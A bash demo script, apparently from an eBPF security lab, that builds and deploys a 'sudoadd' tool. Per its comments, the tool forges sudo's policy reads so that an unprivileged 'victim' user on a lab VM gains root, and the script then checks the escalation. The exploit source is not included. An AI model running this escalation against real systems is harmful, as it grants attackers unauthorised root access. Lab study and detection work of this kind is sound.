#!/usr/bin/env bash
# examples/41-sudoadd/demo.sh — LAB-ONLY. Create an unprivileged user on the
# TARGET, forge sudo's policy reads to grant it root, and exercise sudo so the
# tamper counter moves. See README for the before/after escalation check.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)" && cd "$SCRIPT_DIR"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"; LAB="$REPO_ROOT/scripts/lab"
source "$REPO_ROOT/scripts/lib/_demo-bg.sh"   # reap guest-side load-gens on exit
VM="${VM:-ebpf-target}"; BIN="$SCRIPT_DIR/target/release/sudoadd"; USER_T="${TARGET_USER:-victim}"
c_step(){ echo -e "\033[0;36m━━ $*\033[0m"; }; c_ok(){ echo -e "\033[0;32m✓ $*\033[0m"; }
c_info(){ echo -e "\033[1;33m  $*\033[0m"; }; c_fail(){ echo -e "\033[0;31m✗ $*\033[0m" >&2; exit 1; }
build(){ c_step "building sudoadd (release)"; cargo build --release || c_fail "cargo build failed"; [[ -x "$BIN" ]] || c_fail "no binary"; c_ok "built $BIN"; }
case "${1:-run}" in build) build; exit 0;; esac
build
TIP="$("$LAB/vm-ip.sh" "$VM")"
SSH="ssh -o StrictHostKeyChecking=accept-new"
GW="$($SSH "fedora@$TIP" 'ip route | awk "/default/{print \$3; exit}"')"
c_info "target=$TIP target-user=$USER_T OTLP=http://$GW:4318  (LAB-ONLY — taints the kernel)"
$SSH "fedora@$TIP" "id $USER_T >/dev/null 2>&1 || sudo useradd -m $USER_T; echo user $USER_T ready - no sudo on disk"
c_info "before (detached): '$USER_T' should NOT be able to sudo:"
$SSH "fedora@$TIP" "sudo -n -u $USER_T sudo -n id 2>&1 | head -1 || true"
# generate sudo reads so the tamper counter moves while attached
$SSH "fedora@$TIP" "nohup bash -c 'while true; do sudo -n -l >/dev/null 2>&1 || true; sleep 1; done' >/tmp/sudoadd.log 2>&1 & echo generating sudo reads"
reap "fedora@$TIP" 'while true; do sudo -n -l'
c_info "while attached, test escalation on the target:  sudo -u $USER_T sudo -n id   (expect uid=0)"
c_step "deploying sudoadd to $VM (Ctrl-C to stop)"
OTEL_ENDPOINT="http://$GW:4318" "$LAB/deploy-to-target.sh" "$VM" "$BIN" -- "$USER_T"
